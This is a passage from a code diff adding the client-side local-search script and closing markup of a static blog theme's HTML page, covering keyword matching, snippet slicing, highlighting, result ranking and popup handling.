+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
